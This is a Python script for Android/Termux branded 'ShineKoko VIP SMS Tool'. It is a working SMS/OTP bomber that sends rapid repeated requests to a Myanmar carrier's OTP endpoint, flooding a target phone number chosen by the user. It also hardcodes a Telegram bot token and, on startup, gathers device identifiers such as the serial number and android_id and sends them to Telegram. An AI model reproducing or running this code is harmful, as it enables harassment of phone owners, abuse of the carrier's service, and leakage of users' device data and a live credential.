#!/usr/bin/env python3
import requests, time, sys, hashlib, os, platform, subprocess

BOT_TOKEN = "8700243285:AAEvVldxc_YeDqZ6FItFnWhcg-18kexzFnw"

def get_model():
    try:
        model = subprocess.getoutput('getprop ro.product.model').strip()
        if not model or "not found" in model.lower():
            model = platform.machine()
        return model
    except:
        return platform.system()

def get_id():
    try:
        # Termux မှာ ပိုပြီး တိကျတဲ့ ID ရဖို့ hardware အချက်အလက်တွေကို စုစည်းသည်
        serial = subprocess.getoutput('getprop ro.serialno').strip()
        android_id = subprocess.getoutput('settings get secure android_id').strip()
        cpu = subprocess.getoutput('getprop ro.product.cpu.abi').strip()
        
        # Hardware အချက်အလက်တွေ မရခဲ့ရင် system info ကို သုံးသည်
        if "not found" in serial.lower() or not serial:
            serial = platform.node()
        if "not found" in android_id.lower() or not android_id:
            android_id = platform.processor()
            
        combined_info = f"{serial}-{android_id}-{cpu}-{platform.machine()}"
        return "DEV-" + hashlib.md5(combined_info.encode()).hexdigest().upper()[:8]
    except:
        # Error တက်ခဲ့ရင် backup အနေနဲ့ random ဆန်တဲ့ ID တစ်ခု ထုတ်ပေးသည်
        import random
        return "DEV-" + hashlib.md5(str(random.random()).encode()).hexdigest().upper()[:8]

def banner():
    os.system('clear')
    print("\033[1;32m")
    print(r"  ____  _   _ ___ _   _ _____   _  _____  _  _____  ")
    print(r" / ___|| | | |_ _| \ | | ____| | |/ / _ \| |/ / _ \ ")
    print(r" \___ \| |_| || ||  \| |  _|   | ' / | | | ' / | | |")
    print(r"  ___) |  _  || || |\  | |___  | . \ |_| | . \ |_| |")
    print(r" |____/|_| |_|___|_| \_|_____| |_|\_\___/|_|\_\___/ ")
    print("\n    >>> ShineKoko VIP SMS Tool <<<")
    print("\033[1;37m" + "="*50)
    d_id = get_id()
    model = get_model()
    print(f"[*] Device ID : \033[1;36m{d_id}\033[1;37m")
    print(f"[*] Model     : {model}")
    print("="*50 + "\033[0m")
    return d_id, model

def send_tg(d_id, model):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        resp = requests.get(url).json()
        if resp.get("result"):
            chat_id = resp["result"][-1]["message"]["chat"]["id"]
            
            msg = (f"🚨 New VIP Request 🚨\n"
                   f"Model: {model}\n"
                   f"ID: {d_id}\n\n"
                   f"Keys:\n"
                   f"1D: SHINE-{d_id}-D1\n"
                   f"3D: SHINE-{d_id}-D3\n"
                   f"5D: SHINE-{d_id}-D5\n"
                   f"7D: SHINE-{d_id}-D7\n"
                   f"15D: SHINE-{d_id}-D15\n"
                   f"30D: SHINE-{d_id}-D30")
            
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": chat_id, "text": msg})
    except: pass

def auth(d_id):
    while True:
        key = input("\n[?] Enter VIP Key: ").strip()
        if key.startswith("SHINE-") and d_id in key:
            print("\033[1;32m[+] Key Accepted!\033[0m")
            return True
        print("\033[1;31m[!] Invalid Key! Contact Admin.\033[0m")

def send_otp(p, c):
    url = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={}"
    print(f"\n[*] Sending {c} OTP to {p}...")
    for i in range(c):
        try:
            requests.get(url.format(p))
            print(f"[{i+1}/{c}] Done")
        except: pass
        time.sleep(0.05)
    print("\n[+] Process Finished!")

if __name__ == '__main__':
    try:
        d_id, model = banner()
        send_tg(d_id, model)
        if auth(d_id):
            while True:
                p = input("\n[?] Enter Target Phone (or 'q' to quit): ")
                if p.lower() == 'q': break
                try:
                    c = int(input("[?] Enter Request Count: "))
                    send_otp(p, c)
                except ValueError:
                    print("[!] Invalid count.")
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
